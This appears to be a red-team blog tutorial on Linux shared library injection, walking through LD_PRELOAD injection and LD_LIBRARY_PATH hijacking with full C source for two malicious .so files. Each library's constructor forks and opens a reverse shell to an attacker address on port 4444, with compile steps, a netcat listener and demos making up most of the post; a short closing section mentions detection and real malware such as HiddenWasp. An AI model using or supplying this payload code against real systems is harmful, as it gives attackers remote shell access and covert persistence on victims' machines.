---
title:  "Linux hacking part 10: Shared library injection and hijacking. Simple C examples"
date:   2026-03-12 02:00:00 +0200
header:
  teaser: "/assets/images/193/2026-03-15_20-48.png"
categories:
  - linux
tags:
  - red team
  - linux
  - malware
  - injection
  - shellcode
---

﷽

Hello, cybersecurity enthusiasts and white hackers!        

![malware](/assets/images/193/2026-03-15_20-48.png){:class="img-responsive"}    

This post is based on an exercise for my students and readers.    

In my previous posts, we spent a lot of examples in the Windows world exploring DLL hijacking and injection. But what about linux? As we move toward the second edition of my book, it's time to dive into the "blue ocean" of linux exploitation.    

Today, I will explore how shared libraries (`.so` files) can be used to hijack legitimate processes. We'll cover everything from the classic `LD_PRELOAD` trick to the more permanent binary patching.    

### concept

On linux, when a program starts, the dynamic linker (`ld-linux.so`) is responsible for loading shared libraries. Just like Windows looks for `.dll` files, linux looks for `.so` (shared object) files. If we can trick the linker into loading our malicious library instead of a legitimate one, we win.    

To make our library execute code immediately upon loading, we use the `constructor` attribute:    

```cpp
void __attribute__((constructor)) init().
```

This tells the linker: *"run this function before the main program even starts."*     

### practical example 1

First, let's create our "evil" library. I've added a `fork()` so that our [reverse shell](/tutorial/2021/09/11/reverse-shells.html) runs in the background, allowing the victim process to continue its work without hanging.     

Full source code is looks like the following (`evil.c`):     

```cpp
/*
 * evil.c
 * shared library payload for .so injection
 * author: @cocomelonc
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

// the constructor attribute ensures this runs as soon as the library is loaded
void __attribute__((constructor)) init() {
  // fork to stay stealthy and not block the victim process
  if (fork() == 0) {
    // attacker details
    const char* ip = "127.0.0.1";
    int port = 4444;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    // create socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // connect to attacker
    // we use a loop to wait for the listener to be ready
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
      // redirect stdin, stdout, and stderr to the socket
      for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
      }

      // execute shell
      char *args[] = {"/bin/sh", NULL};
      execve("/bin/sh", args, NULL);
    }
  }
}
```

Then, our victim is a simple process (`meow.c`):    

```cpp
/*
 * meow.c
 * simple "victim" process for injection testing
 * author: @cocomelonc
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  printf("victim process started. pid: %d\n", getpid());

  while (1) {
    printf("meow-meow... pid: %d\n", getpid());
    sleep(5); 
  }

  return 0;
}
```

As you can see, it's the same logic as in my [linux process injection with ptrace](/linux/2024/11/22/linux-hacking-3.html) post.    

### demo 1

First of all compile our victim process:    

```bash
gcc -o meow meow.c
```

![malware](/assets/images/193/2026-03-15_20-10.png){:class="img-responsive"}    

For checking correctness, we can run it:    

```bash
./meow
```

![malware](/assets/images/193/2026-03-15_20-24.png){:class="img-responsive"}     

Then, compile our malicious `.so`:    

```bash
gcc -shared -fPIC evil.c -o evil.so
```

![malware](/assets/images/193/2026-03-15_20-11.png){:class="img-responsive"}    

We use `-shared` to create a library and `-fPIC` for position-independent code.     

At the next step, start the netcat listener (attacker machine):    

```bash
nc -nlvp 4444
```

![malware](/assets/images/193/2026-03-15_20-13.png){:class="img-responsive"}    

Finally, inject via `LD_PRELOAD`:     

```bash
LD_PRELOAD=./evil.so ./meow
```

![malware](/assets/images/193/2026-03-15_20-25.png){:class="img-responsive"}    

![malware](/assets/images/193/2026-03-15_20-25_1.png){:class="img-responsive"}    

![malware](/assets/images/193/2026-03-15_20-26.png){:class="img-responsive"}    

It works perfectly!    

Also, works as expected for the remote attacker's machine (`10.10.10.1:4444` in my lab) logic:    

![malware](/assets/images/193/2026-03-15_20-28.png){:class="img-responsive"}    

![malware](/assets/images/193/2026-03-15_20-47.png){:class="img-responsive"}    

![malware](/assets/images/193/2026-03-15_20-49.png){:class="img-responsive"}    

This is the most well-known method. the `LD_PRELOAD` environment variable tells the linker to load specific libraries before any others, including the standard C library.     

### practical example 2

What about hijacking? Second method is hijacking via `LD_LIBRARY_PATH`. This is a direct analog of searching for DLLs in system folders for Windows. The linker first checks the paths in the `LD_LIBRARY_PATH` variable.    

To make the example realistic, our `meow` will now actually depend on the external library `libcat.so` (`meow2.c`):    

```cpp
/*
 * meow2.c
 * victim process that depends on libcat.so
 * author: @cocomelonc
 */
#include <stdio.h>
#include <unistd.h>

// forward declaration of the library function
extern void meow_sound();

int main() {
  printf("victim process started. pid: %d\n", getpid());
  while(1) {
    meow_sound();
    sleep(5);
  }
  return 0;
}
```

Legit library (`cat.c`):     

```cpp
/*
 * cat.c
 * legitimate shared library
 * author: @cocomelonc
 */
#include <stdio.h>

void meow_sound() {
  printf("legit meow: meow-purr...\n");
}
```

Next one is "evil" library. It should export the same function as the original so that the process doesn't crash, but inside we'll hide our "surprise" in the constructor.    

Something like the following `evil2.c`:   

```cpp
/*
 * evil2.c
 * malicious shared library (hijacker)
 * author: @cocomelonc
 */
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

// constructor runs before the main function of the victim
void __attribute__((constructor)) init() {
  if (fork() == 0) {
    // simulation of a reverse shell or any payload
    printf("evil2.so injected! executing payload...\n");
    // system("touch /tmp/hacked");
    // exit(0);

    // attacker details
    // const char* ip = "127.0.0.1";
    const char* ip = "10.10.10.1";
    int port = 4444;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    // create socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // connect to attacker
    // we use a loop to wait for the listener to be ready
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
      // redirect stdin, stdout, and stderr to the socket
      for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
      }

      // execute shell
      char *args[] = {"/bin/sh", NULL};
      execve("/bin/sh", args, NULL);
    }
  }
}

// export the same symbol as the legit library to prevent crashes
void meow_sound() {
  printf("malicious meow: meow-squeek!\n");
}
```

### demo 2

Let's see how to trigger this logic. First of all, we compile a legitimate lib in `/usr/lib`:    

```bash
gcc -shared -fPIC cat.c -o libcat.so
sudo cp libcat.so /usr/lib/
```

![malware](/assets/images/193/2026-03-15_23-38.png){:class="img-responsive"}    

Then compile our "victim" process (and linking):   

```bash
gcc meow2.c -L. -lcat -o meow2
```

![malware](/assets/images/193/2026-03-15_23-39.png){:class="img-responsive"}    

Next, compile the hijacker (`evil2.so`) and rename it to `libcat.so`:    

```bash
gcc -shared -fPIC evil2.c -o ./libcat.so
```

![malware](/assets/images/193/2026-03-15_23-40.png){:class="img-responsive"}    

Prepare the listener again:    

```bash
nc -nlvp 4444
```

![malware](/assets/images/193/2026-03-15_23-41.png){:class="img-responsive"}    

![malware](/assets/images/193/2026-03-15_23-42.png){:class="img-responsive"}    

Everything is ready, hijack the path:    

```bash
export LD_LIBRARY_PATH=./
./meow2
```

![malware](/assets/images/193/2026-03-15_23-52.png){:class="img-responsive"}    

![malware](/assets/images/193/2026-03-15_23-53.png){:class="img-responsive"}    

As you can see, the linker will find our malicious `libcat.so` in the current dir and load it instead of the original one.     

As we can see, shared library hijacking in Linux is just as powerful as dll hijacking in Windows.    

You might think that `LD_PRELOAD` is an old trick that everyone detects. But in the world of APT, simplicity combined with deep system knowledge is the ultimate weapon.     

For example, discovered in 2019, [HiddenWasp](https://malpedia.caad.fkie.fraunhofer.de/details/elf.hiddenwasp) is a sophisticated linux malware (likely linked to chinese-speaking actors) that uses a user-mode rootkit based on `LD_PRELOAD`.    

Whether it's a state-sponsored APT group or a modern linux rootkit like orbit, the goal is always the same: hijack the execution flow through the linker.    

For a malware developer, this is the "path of least resistance.", it is a predictable behavioral pattern that we can detect by looking at the physics of the operating system.     

I hope this post with practical example is useful for malware researchers, linux programmers and everyone who interested on linux hacking techniques.    

[Linux malware development 1: intro to kernel hacking. Simple C example](/linux/2024/06/20/linux-kernel-hacking-1.html)      
[Linux malware development 2: find process ID by name. Simple C example](/linux/2024/09/16/linux-hacking-2.html)      
[reverse shells](/tutorial/2021/09/11/reverse-shells.html)    
[HiddenWasp](https://malpedia.caad.fkie.fraunhofer.de/details/elf.hiddenwasp)    
[source code in github](https://github.com/cocomelonc/meow/tree/master/2026-03-12-linux-hacking-10)    

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!         
*PS. All drawings and screenshots are mine*       
